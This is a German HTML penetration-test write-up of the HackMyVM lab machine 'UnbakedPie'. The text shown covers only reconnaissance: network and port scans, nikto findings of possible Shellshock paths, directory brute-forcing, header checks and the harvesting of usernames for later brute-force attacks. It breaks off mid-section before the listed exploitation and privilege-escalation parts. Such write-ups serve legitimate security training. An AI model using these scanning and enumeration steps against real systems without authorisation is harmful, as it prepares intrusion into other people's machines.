<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UnbakedPie - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
  <div class="header-bg">
        <h1>UnbakedPie - HackMyVM - Level: Hard - Bericht</h1>
        <div class="level-container">
            <h2>Hard</h2>
            <div class="circle">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
                <div class="tool-item">arp-scan</div>
                <div class="tool-item">vi</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">nikto</div>
                <div class="tool-item">feroxbuster</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">python3</div>
                <div class="tool-item">sqlite3</div>
                <div class="tool-item">nc</div>
                <div class="tool-item">chisel</div>
                <div class="tool-item">ssh</div>
                <div class="tool-item">sudo</div>
                <div class="tool-item">cat</div>
                <div class="tool-item">id</div>
                <div class="tool-item">ls</div>
                <div class="tool-item">ip</div>
                <div class="tool-item">capsh</div>
                <div class="tool-item">rm</div>
                <div class="tool-item">wget</div>
                <div class="tool-item">convert</div>
                <div class="tool-item">exiftool</div>
                <div class="tool-item">mv</div>
                <div class="tool-item">chmod</div>
                <div class="tool-item">docker (conceptual)</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept">Proof of Concept</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
            <p class="analysis">
                <strong>Analyse:</strong> Der erste und oft entscheidende Schritt in einem Penetrationstest ist die Erkundung des Netzwerks, die sogenannte Reconnaissance. Hier verwende ich das Tool <span class="command">arp-scan</span>, um alle aktiven Geräte im lokalen Netzwerk zu identifizieren. Der Befehl <span class="command">arp-scan -l</span> scannt das lokale Subnetz, das durch die Netzwerkkonfiguration meines Angreifersystems (Kali Linux) bestimmt wird. Die Ausgabe wird dann mittels der Pipe (<span class="command">|</span>) an den <span class="command">grep</span>-Befehl weitergeleitet. <span class="command">grep "PCS"</span> filtert die Zeilen, die den String "PCS" enthalten, da ich weiß, dass VirtualBox-Maschinen oft diesen Hersteller im ARP-Scan anzeigen. Schließlich wird die gefilterte Ausgabe an <span class="command">awk '{print $1}'</span> übergeben. <span class="command">awk</span> ist ein mächtiges Textverarbeitungswerkzeug, und <span class="command">'{print $1}'</span> bedeutet, dass nur das erste Feld (durch Leerzeichen getrennt, was in diesem Fall die IP-Adresse ist) jeder passenden Zeile ausgegeben wird. Dieses Vorgehen ermöglicht es mir, schnell und gezielt die IP-Adresse der Zielmaschine zu extrahieren.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Dieser Schritt ist grundlegend und sehr effektiv, um die IP-Adresse der Ziel-VM in einer simulierten Netzwerkumgebung zu finden. Die Kombination von Standard-Linux-Tools wie <span class="command">grep</span> und <span class="command">awk</span> mit einem spezifischen Netzwerkscanner wie <span class="command">arp-scan</span> zeigt einen sauberen und automatisierten Ansatz zur Zielidentifizierung. Die Ausgabe von <span class="command">arp-scan</span> liefert nicht nur die IP, sondern oft auch die MAC-Adresse und Informationen zum Hersteller, was zusätzliche Hinweise auf die Virtualisierungsplattform oder den Gerätetyp geben kann, wie später im Nmap-Scan bestätigt wird.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Nach der Identifizierung der IP-Adresse sollte der nächste Schritt ein umfassender Portscan sein, um offene Dienste und potenzielle Angriffsvektoren zu finden. Parallel dazu kann mit der aktiven Aufklärung auf der gefundenen IP begonnen werden.
                <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann verhindern, dass ein Angreifer, der Zugang zu einem Teil des Netzwerks hat, einfach alle anderen Geräte im selben Subnetz via ARP-Scan oder ähnlichen Methoden identifiziert. Deaktivieren von ARP-Responses für nicht benötigte Systeme oder die Implementierung von Network Access Control (NAC) könnte die Aufklärung erschweren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
                </div>
                <div class="terminal">
                    <pre>192.168.2.48</pre>
                </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Nachdem die IP-Adresse der Zielmaschine (192.168.2.48) ermittelt wurde, ist es nützlich, einen Hostnamen dafür zu definieren, um die Arbeit in weiteren Schritten zu erleichtern. Hierfür editiere ich die lokale <span class="command">/etc/hosts</span>-Datei auf meinem Angreifer-System. Ich verwende den <span class="command">vi</span>-Editor, da er standardmäßig auf den meisten Linux-Systemen verfügbar ist. Ich füge eine neue Zeile hinzu, die die IP-Adresse (192.168.2.48) dem gewünschten Hostnamen (<span class="command">unbakedpie.hmv</span>) zuordnet. Dies simuliert einen DNS-Eintrag und ermöglicht es mir, im weiteren Verlauf statt der IP-Adresse den leichter zu merkenden Hostnamen zu verwenden.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Das Hinzufügen eines Eintrags in die <span class="command">/etc/hosts</span> ist eine Standardpraxis im Pentesting, um die Lesbarkeit und Wartbarkeit der verwendeten Befehle zu verbessern, insbesondere wenn man mit mehreren Zielen gleichzeitig arbeitet oder Hostnamen in Webanwendungen relevant sind. Es hat keinen Einfluss auf das Zielsystem selbst, sondern ist rein eine Konfigurationsanpassung auf dem Angreifer-System.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Dies ist ein einfacher, aber effektiver Schritt, der die Benutzerfreundlichkeit während des Pentests erhöht. Es sollte zur Gewohnheit werden, relevante Hostnamen in die <span class="command">/etc/hosts</span> einzutragen, sobald sie identifiziert wurden.
                <br><strong>Empfehlung (Admin):</strong> Diese Aktion findet ausschließlich auf dem Angreifer-System statt und hat keine direkten Implikationen für die Verteidigung des Zielsystems. Der Fokus sollte auf der Sicherung der Dienste und nicht auf der Erkennung solcher lokaler Konfigurationsänderungen beim Angreifer liegen.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">vi /etc/hosts</span></div>
                </div>
                <div class="terminal">
                    <pre>
  192.168.2.48    unbakedpie.hmv
</pre>
                </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Jetzt, da ich die IP-Adresse (oder den Hostnamen) des Ziels kenne, führe ich einen umfassenden Portscan mit <span class="command">nmap</span> durch. Der Befehl <span class="command">nmap -sS -sC -sV -p- -T5 -AO unbakedpie.hmv</span> ist eine Kombination verschiedener Optionen:
                <br>- <span class="command">-sS</span>: Führt einen SYN-Scan (Stealth Scan) durch. Dabei wird nur der erste Teil des Drei-Wege-Handshakes gesendet, um zu prüfen, ob ein Port offen ist, ohne eine vollständige Verbindung aufzubauen. Dies ist oft unauffälliger als ein voller Connect Scan.
                <br>- <span class="command">-sC</span>: Führt Standard-Skripte aus, die zur Diensterkennung und Schwachstellenprüfung nützlich sind.
                <br>- <span class="command">-sV</span>: Versucht, die Version des Dienstes zu erkennen, der auf einem offenen Port läuft. Dies ist entscheidend, um bekannte Schwachstellen für spezifische Softwareversionen zu finden.
                <br>- <span class="command">-p-</span>: Scannt alle 65535 TCP-Ports. Standardmäßig scannt Nmap nur die am häufigsten verwendeten Ports.
                <br>- <span class="command">-T5</span>: Setzt das Timing-Template auf "Insane" (5). Dies beschleunigt den Scan, kann aber in unzuverlässigen Netzwerken zu ungenauen Ergebnissen führen und ist offensichtlicher.
                <br>- <span class="command">-AO</span>: Versucht, das Betriebssystem zu erkennen (<span class="command">-O</span>) und führt alle Aggressive Optionen aus (<span class="command">-A</span>), was <span class="command">-sV</span>, <span class="command">-sC</span> und OS-Erkennung einschließt.
                <br>Die Ausgabe zeigt die offenen Ports, die erkannten Dienste und deren Versionen sowie eine Schätzung des Betriebssystems.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Der Nmap-Scan liefert essenzielle Informationen über die Angriffsfläche. Die Identifizierung von <span class="command">PORT 5003/tcp</span> mit dem Dienst <span class="command">http</span> und der Version <span class="command">WSGIServer 0.2 (Python 3.8.6)</span> ist ein wichtiger Fund, da Webserver oft erste Angriffspunkte sind. <span class="command">PORT 22/tcp</span> mit <span class="command">ssh</span> ist ebenfalls relevant, da SSH ein potenzieller Zugangspunkt sein kann, falls Anmeldedaten gefunden werden. Die OS-Erkennung ist weniger zuverlässig ("Warning: OSScan results may be unreliable"), gibt aber einen Hinweis auf ein Linux-System. Die <span class="command">MAC Address</span> bestätigt die VirtualBox-Umgebung, was mit dem <span class="command">arp-scan</span> Ergebnis übereinstimmt. Gefilterte Ports (<span class="command">65534 filtered tcp ports</span>) deuten auf eine Firewall hin, die die meisten Ports blockiert.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Die offenen Ports 5003 (HTTP) und 22 (SSH) sind nun die Hauptziele für die weitere Enumeration. Der Webserver auf Port 5003 sollte intensiv auf Schwachstellen geprüft werden, während SSH auf mögliche Brute-Force-Angriffe oder die Verwendung kompromittierter Anmeldedaten vorbereitet werden sollte, falls solche im Zuge der Web-Enumeration gefunden werden.
                <br><strong>Empfehlung (Admin):</strong> Eine Firewall ist aktiv, was gut ist, aber sie scheint Ports offen zu lassen, die möglicherweise nicht öffentlich zugänglich sein müssten (wie Port 5003, wenn er nur intern genutzt werden soll). Überprüfen Sie die Firewallregeln und schließen Sie alle Ports, die nicht absolut notwendig sind. Stellen Sie sicher, dass Dienste, die offen sind, wie SSH und der WSGIServer, aktuell sind und sicher konfiguriert sind, um Schwachstellen zu minimieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.48</span></div>
                </div>
                <div class="terminal">
                    <pre>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 13:49 CEST
Nmap scan report for unbakedpie.hmv (192.168.2.48)
Host is up (0.00013s latency).
Not shown: <span class="command">65534 filtered tcp ports (no-response)</span>
<span class="command">PORT     STATE SERVICE VERSION</span>
<span class="command">5003/tcp open  http    WSGIServer 0.2 (Python 3.8.6)</span>
|_http-title: <span class="command">[Un]baked | /</span>
<span class="command">MAC Address: 08:00:27:44:9B:6E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.16 - 4.6 (97%), Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), Linux 3.13 - 4.4 (95%), Linux 3.8 - 3.16 (95%), Linux 4.4 (95%), Linux 3.13 (94%), Linux 4.2 (92%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%)
No exact <span class="command">OS</span> matches for host (test conditions non-ideal).
Network Distance: 1 hop

<span class="command">TRACEROUTE</span>
<span class="command">HOP RTT     ADDRESS</span>
1   0.12 ms <span class="command">unbakedpie.hmv (192.168.2.48)</span>

<span class="command">OS</span> and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="command">Nmap done</span>: 1 IP address (1 host up) scanned in 453.71 seconds
</pre>
                </div>
            </div>
        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
            <p class="analysis">
                <strong>Analyse:</strong> Mit dem Wissen um den offenen HTTP-Port 5003 beginne ich die Enumeration der Webanwendung mit <span class="command">nikto</span>. <span class="command">nikto -h http://192.168.2.48:5003</span> ist ein Webserver-Scanner, der eine Vielzahl von Tests auf dem Ziel durchführt, um bekannte Schwachstellen, Konfigurationsfehler und potenziell interessante Dateien oder Verzeichnisse zu finden. Er prüft auf veraltete Serversoftware, gefährliche Dateien, fehlende Sicherheits-Header und mehr.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Nikto-Ausgabe liefert sofort mehrere wichtige Hinweise. Zuerst bestätigt sie den <span class="command">Server: WSGIServer/0.2 CPython/3.8.6</span>. Dann meldet sie, dass ein <span class="command">Cookie csrftoken created without the httponly flag</span> gesetzt wird. Das bedeutet, das Cookie ist über JavaScript zugänglich, was bei XSS-Schwachstellen ausgenutzt werden könnte, um die Session zu stehlen. Der kritischste Fund sind die vielen Meldungen, dass die Site auf verschiedenen CGI-Pfaden (<span class="command">/cgi_wrapper</span>, <span class="command">/ezmlm-browse</span>, <span class="command">/php-cgi</span>, etc.) <span class="command">appears vulnerable to the 'shellshock' vulnerability (CVE-2014-6271)</span>. Shellshock ist eine schwerwiegende Lücke, die in bestimmten Versionen der Bash-Shell auftrat und bei Ausnutzung Remote Code Execution (RCE) ermöglichen kann, oft über CGI-Skripte, die Shell-Befehle ausführen. Wenn diese Pfade existieren und Bash in einer verwundbaren Version läuft, könnte dies ein direkter Weg zum initialen Zugriff sein. Zusätzlich werden fehlende Sicherheits-Header für <span class="command">/static/</span> bemängelt (<span class="command">X-Content-Type-Options header is not set</span>), was Browserschwachstellen (MIME-Sniffing) begünstigen könnte.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Die Shellshock-Meldungen müssen sofort verifiziert werden. Ich werde versuchen, die Schwachstelle gezielt anzutesten, um Remote Code Execution zu erreichen. Die fehlenden Sicherheits-Header sind nachrangig, aber ebenfalls dokumentationswürdig. Das `csrftoken` ohne `httponly` wird notiert, falls eine XSS-Lücke gefunden wird.
                <br><strong>Empfehlung (Admin):</strong> Prüfen Sie dringend die Existenz und Konfiguration der genannten CGI-Pfade. Stellen Sie sicher, dass die Bash-Version auf dem System gepatcht ist, um CVE-2014-6271 zu beheben, oder entfernen Sie die anfälligen CGI-Skripte, falls sie nicht benötigt werden. Implementieren Sie dringend alle relevanten Sicherheits-Header (X-Content-Type-Options, X-Frame-Options, Content-Security-Policy etc.) auf dem Webserver, um gängige Browserschwachstellen zu mindern. Setzen Sie das `httponly`-Flag für alle Cookies, die keinen JavaScript-Zugriff benötigen, um das Risiko bei XSS zu minimieren.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nikto -h http://192.168.2.48:5003</span></div>
                </div>
                <div class="terminal">
                    <pre>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <span class="command">192.168.2.48</span>
+ Target Hostname:    <span class="command">192.168.2.48</span>
+ Target PORT:        <span class="command">5003</span>
+ Start Time:         2025-06-16 13:58:10 (GMT2)
---------------------------------------------------------------------------
+ Server: <span class="command">WSGIServer/0.2 CPython/3.8.6</span>
+ /: <span class="password">Cookie csrftoken created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies</span>
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /cgi_wrapper: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /ezmlm-browse: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /php: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /php4: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /php5: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /php-cgi: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /printenv: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /search: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /status: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /test: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /test-cgi: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /welcome: <span class="password">Site appears vulnerable to the 'shellshock' vulnerability. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271]</span>
+ /static/: <span class="password">The X-Content-Type-Options header is not set. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                <strong>Analyse:</strong> Um die Webanwendung weiter zu erkunden und versteckte Verzeichnisse oder Dateien zu finden, setze ich <span class="command">feroxbuster</span> ein. Dieser Befehl führt eine Brute-Force-Suche nach Web-Inhalten durch.
                <br>- <span class="command">--url "http://192.168.2.48:5003"</span>: Definiert die Ziel-URL und den Port.
                <br>- <span class="command">--wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>: Gibt die zu verwendende Wortliste an, eine gängige Liste für Verzeichnisnamen.
                <br>- <span class="command">-x .git,.php,...</span>: Gibt eine Liste von Dateierweiterungen an, die dem Wortlisten-Eintrag angehängt und ebenfalls getestet werden sollen.
                <br>- <span class="command">-s 301 302</span>: Filtert die Ergebnisse, um nur Antworten mit dem Statuscode 301 (Moved Permanently) oder 302 (Found/Moved Temporarily) anzuzeigen. Diese Codes sind oft interessant, da sie auf Weiterleitungen zu anderen Pfaden hindeuten, die existieren.
                <br>Während des Scans identifiziert <span class="command">feroxbuster</span> einige Weiterleitungen. Der Scan wurde abgebrochen (`🚨 Caught ctrl+c 🚨`) vermutlich, weil die Laufzeit zu lang wurde oder die relevanten Pfade bereits gefunden waren. Die aufgeführten Funde sind die, die bis zum Abbruch identifiziert wurden.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Der <span class="command">feroxbuster</span> Scan bestätigt die Existenz der Pfade <span class="command">/accounts/signup</span> und <span class="command">/accounts/login</span> durch 301-Weiterleitungen, sowie <span class="command">/share</span> durch eine 302-Weiterleitung. Obwohl der Scan nicht vollständig durchlief, liefert er wertvolle Hinweise auf die Struktur der Webanwendung, insbesondere auf einen Login- und Registrierungsbereich sowie einen "share"-Bereich, der eine Authentifizierung zu erfordern scheint (`accounts/login?next=/share`). Diese Pfade passen gut zu einer Rezept-Sharing-Seite, wie wir sie auf der Startseite gesehen haben.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Die gefundenen Pfade, insbesondere <span class="command">/accounts/login</span> und <span class="command">/share</span>, sollten manuell oder mit automatisierten Tools weiter untersucht werden, um deren Funktionalität und potenzielle Schwachstellen zu verstehen. Auch der Shellshock-Test sollte auf den vom Nikto-Scan gemeldeten Pfaden fortgesetzt werden.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass unnötige Dateien oder Verzeichnisse, die von Directory Bustern gefunden werden könnten, entfernt oder besser geschützt sind. Konfigurieren Sie den Webserver so, dass er bei nicht existierenden Pfaden konsistent antwortet (z.B. immer 404), um das Enumerieren zu erschweren. Überprüfen Sie, ob die Weiterleitungen (<span class="command">301</span>, <span class="command">302</span>) korrekt und sicher konfiguriert sind.
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">feroxbuster --url "http://192.168.2.48:5003" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 301 302</span></div>
                </div>
                <div class="terminal">
                    <pre>
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ <span class="command">http://192.168.2.48:5003</span>
 🚀  Threads               │ 50
 📖  Wordlist              │ <span class="command">/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
 👌  Status Codes          │ <span class="command">[301, 302]</span>
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ <span class="command">[git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
<span class="command">301      GET        0l        0w        0c http://192.168.2.48:5003/accounts/signup => http://192.168.2.48:5003/accounts/signup/</span>
<span class="command">301      GET        0l        0w        0c http://192.168.2.48:5003/accounts/login => http://192.168.2.48:5003/accounts/login/</span>
<span class="command">302      GET        0l        0w        0c http://192.168.2.48:5003/share => accounts/login?next=/share</span>
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_192_168_2_48:5003-1750075669.state ...
[>-------------------] - 9m     92308/18527684 30h     found:3       errors:0      
[>-------------------] - 9m     30800/6175316 56/s    http://192.168.2.48:5003/ 
[>-------------------] - 9m     29428/6175316 54/s    http://192.168.2.48:5003/accounts/signup/ 
[>-------------------] - 9m     29428/6175316 54/s    http://192.168.2.48:5003/accounts/login/      
</pre>
                </div>
            </div>

             <p class="analysis">
                <strong>Analyse:</strong> Um detaillierte Informationen über den Webserver und die erhaltenen Header zu bekommen, nutze ich <span class="command">curl</span> mit den Optionen <span class="command">-Iv</span>.
                <br>- <span class="command">-I</span>: Führt einen HEAD-Request durch, der nur die Header-Informationen abruft, ohne den Body der Antwort herunterzuladen.
                <br>- <span class="command">-v</span>: Aktiviert den Verbose-Modus, der Details zum Kommunikationsprozess anzeigt, einschließlich der gesendeten Anforderung und der erhaltenen Antwort.
                <br>Der Befehl <span class="command">curl -Iv http://192.168.2.48:5003</span> sendet eine HEAD-Anfrage an die Startseite des Webservers auf Port 5003 und zeigt den detaillierten Austausch.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Ausgabe bestätigt die grundlegenden Informationen aus dem Nmap-Scan: <span class="command">HTTP/1.1 200 OK</span> Status, den <span class="command">Server: WSGIServer/0.2 CPython/3.8.6</span> und den <span class="command">Content-Type: text/html</span>. Wichtiger ist die Analyse der Sicherheits-Header und Cookies. Im Gegensatz zur Nikto-Meldung sind hier die Header <span class="command">X-Frame-Options: DENY</span>, <span class="command">X-Content-Type-Options: nosniff</span> und <span class="command">Referrer-Policy: same-origin</span> *gesetzt*. Das ist eine bessere Konfiguration als von Nikto gemeldet, zumindest für die Startseite. Der <span class="command">Set-Cookie</span> Header ist aber weiterhin interessant. Er setzt das <span class="command">csrftoken</span> Cookie mit Parametern wie <span class="command">expires</span>, <span class="command">Max-Age</span>, <span class="command">Path=/</span> und <span class="command">SameSite=Lax</span>. Das <span class="command">httponly</span>-Flag, das bei Nikto bemängelt wurde, fehlt hier ebenfalls in der Ausgabe. Dies bekräftigt die Möglichkeit, dass dieses Cookie über clientseitiges Skripting zugänglich sein könnte. Der <span class="command">Vary: Cookie</span> Header zeigt an, dass die Antwort vom Inhalt des Cookie-Headers abhängen kann, was bei der Untersuchung der Session-Handhabung relevant ist.
            </p>
            <p class="recommendation">
                <strong>Empfehlung (Pentester):</strong> Die Header-Informationen geben einen guten Überblick über die Basis-Sicherheitseinstellungen des Webservers. Das fehlende <span class="command">httponly</span>-Flag beim <span class="command">csrftoken</span> Cookie bleibt ein relevanter Punkt, falls XSS gefunden wird. Die gesetzten X-Frame-Options, X-Content-Type-Options und Referrer-Policy sind positive Funde, schränken aber die Ausnutzung anderer Schwachstellen (wie RCE) nicht direkt ein.
                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle sicherheitsrelevanten Header (X-Frame-Options, X-Content-Type-Options, Content-Security-Policy, Referrer-Policy, Strict-Transport-Security) konsistent auf *allen* Seiten und für alle Arten von Inhalten gesetzt sind. Setzen Sie das <span class="command">httponly</span>-Flag für alle Cookies, die nicht explizit von clientseitigem JavaScript gelesen werden müssen (was für ein CSRF-Token der Fall sein sollte).
            </p>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -Iv http://192.168.2.48:5003</span></div>
                </div>
                <div class="terminal">
                    <pre>
*   Trying 192.168.2.48:5003...
* Connected to 192.168.2.48 (192.168.2.48) port 5003
* using HTTP/1.x
> HEAD / HTTP/1.1
> Host: 192.168.2.48:5003
> User-Agent: curl/8.13.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
<span class="command">HTTP/1.1 200 OK</span>
< Date: Mon, 16 Jun 2025 12:08:09 GMT
<span class="command">Date: Mon, 16 Jun 2025 12:08:09 GMT</span>
< Server: WSGIServer/0.2 CPython/3.8.6
<span class="command">Server: WSGIServer/0.2 CPython/3.8.6</span>
< Content-Type: text/html; charset=utf-8
<span class="command">Content-Type: text/html; charset=utf-8</span>
< X-Frame-Options: DENY
<span class="command">X-Frame-Options: DENY</span>
< Vary: Cookie
<span class="command">Vary: Cookie</span>
< Content-Length: 7453
<span class="command">Content-Length: 7453</span>
< X-Content-Type-Options: nosniff
<span class="command">X-Content-Type-Options: nosniff</span>
< Referrer-Policy: same-origin
<span class="command">Referrer-Policy: same-origin</span>
< Set-Cookie:  csrftoken=R5beSb4alXctlW9Hb9FPn0HIw6anvF3ekT07yg5sliZSQnAk0ArVUisxfQvzyWB1; expires=Mon, 15 Jun 2026 12:08:09 GMT; Max-Age=31449600; Path=/; SameSite=Lax
<span class="password">Set-Cookie:  csrftoken=R5beSb4alXctlW9Hb9FPn0HIw6anvF3ekT07yg5sliZSQnAk0ArVUisxfQvzyWB1; expires=Mon, 15 Jun 2026 12:08:09 GMT; Max-Age=31449600; Path=/; SameSite=Lax</span>
< 

* shutting down connection #0
</pre>
                </div>
            </div>

             <p class="analysis">
                <strong>Analyse:</strong> Ich betrachte den Quellcode der Startseite (http://192.168.2.48:5003/). Dieser Code zeigt die Struktur der Rezept-Website. Ich sehe Links zu "Home" und "About" und eine Liste von Rezepten ("Homemade Pickle", "Pickle Pie", "Blueberry Pie", "Apple Pie", "German Chocolate Pie"). Jedes Rezept wird mit einem Titel, einer Kurzbeschreibung und dem Namen des Benutzers angezeigt, der es gepostet hat, zusammen mit einem Datum. Die Namen der Poster sind <span class="command">ramsey</span>, <span class="command">wan</span> und <span class="command">oliver</span>.
            </p>
            <p class="evaluation">
                <strong>Bewertung:</strong> Die Analyse des Homepage-Inhalts ist wichtig, um die Funktionalität der Website zu verstehen und potenzielle Benutzernamen zu sammeln. Die Namen <span class="command">ramsey</span>, <span class="command">wan</span> und <span class="command">oliver</span> sind höchstwahrscheinlich gültige Benutzernamen auf dem System oder in der Webanwendung. Diese Information ist wertvoll für spätere Brute-Force-Angriffe auf Anmeldedienste wie SSH oder den Web-Login.
            </p>
            <p class="recommendation">
